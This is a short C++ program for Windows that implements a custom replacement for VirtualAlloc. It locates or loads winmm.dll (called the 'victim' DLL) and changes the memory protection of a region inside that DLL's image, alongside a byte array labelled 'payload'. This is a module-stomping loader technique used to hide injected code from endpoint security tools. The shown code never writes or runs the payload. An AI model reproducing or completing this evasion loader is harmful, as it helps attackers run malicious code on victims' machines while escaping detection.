#include <iostream>
#include <Windows.h>
#include <string>

using namespace std;

unsigned char payload[] = { 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0xf9, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
enum ProtectionType { R = 1, W = 2, X = 4, RW = 3, RX = 5, WX = 6, RWX = 7 };
int payloadSize = sizeof(payload);

char* MyOwnVirtualAlloc(int size, ProtectionType protectionType) {
    char dll[] = { 'w','i','n','m','m','.','d','l','l','\0' };

    DWORD protection = 0;
    char* address = nullptr;
    DWORD oldProtect;
    HMODULE victimDLL = GetModuleHandleA(dll);

    if (victimDLL == NULL) {
        victimDLL = LoadLibraryA(dll);
        if (victimDLL != NULL) {
            address = (char*)victimDLL;
        }
    }
    else {
        address = (char*)victimDLL;
    }

    char* allocatedMemory = nullptr;

    switch (protectionType) {
    case R:
        protection = PAGE_READONLY;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case W:
        protection = PAGE_WRITECOPY;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case X:
        protection = PAGE_EXECUTE;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case RW:
        protection = PAGE_READWRITE;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case RX:
        protection = PAGE_EXECUTE_READ;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case WX:
        protection = PAGE_EXECUTE_WRITECOPY;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    case RWX:
        protection = PAGE_EXECUTE_READWRITE;
        allocatedMemory = (char*)address + 2 * 4096 + 12;
        break;
    default:
        protection = PAGE_NOACCESS;
        break;
    }

    if (allocatedMemory != nullptr) {
        VirtualProtect(allocatedMemory, size, protection, &oldProtect);
    }

    return allocatedMemory;
}


int main() {
    cout << "VirtualAlloc-Implementation" << endl;
    char* allocatedMemory = MyOwnVirtualAlloc(payloadSize, X);
    cout << "Allocated memory at: " << hex << (void*)allocatedMemory << endl;
    getchar();
    return 0;
}